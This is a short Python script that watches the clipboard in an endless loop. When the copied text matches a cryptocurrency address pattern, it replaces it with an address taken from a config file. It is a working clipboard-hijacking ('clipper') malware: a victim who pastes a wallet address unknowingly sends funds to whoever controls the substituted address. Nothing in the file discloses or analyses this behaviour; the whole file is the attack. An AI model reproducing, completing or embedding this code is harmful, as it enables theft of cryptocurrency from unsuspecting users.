import clipboard
import re , time
import config






class Inputlistener(object):
    def __init__(self , timer , crypto_db_Rg , crypto_owner) -> None:
        self.timer = timer
        self.crypto_db_Rg = crypto_db_Rg
        self.crypto_owner = crypto_owner


    def CheckOwnerCrypto(self , cryptoName) -> bool:
        if cryptoName in self.crypto_owner:
            if self.crypto_owner[cryptoName] != '' or self.crypto_owner[cryptoName] != None:
                return True
            return False

    def listen(self) -> None:
        while True:
            for CryptoName , CryptoRgxAd in self.crypto_db_Rg.items():
                if re.match(CryptoRgxAd , clipboard.paste().strip() , flags=re.I):
                    if self.CheckOwnerCrypto(CryptoName):
                        self.CopyOwnerCrypto(CryptoName)

            time.sleep(self.timer)

    def CopyOwnerCrypto(self , CryptoName):
        if CryptoName in self.crypto_owner:
            if self.crypto_owner[CryptoName] == '' or self.crypto_owner[CryptoName] == None:
                pass
            else:
                clipboard.copy(self.crypto_owner[CryptoName])







input = Inputlistener(config._set_Sleep_Time , config.crypto_db_Rg , config.crypto_owner)
input.listen()
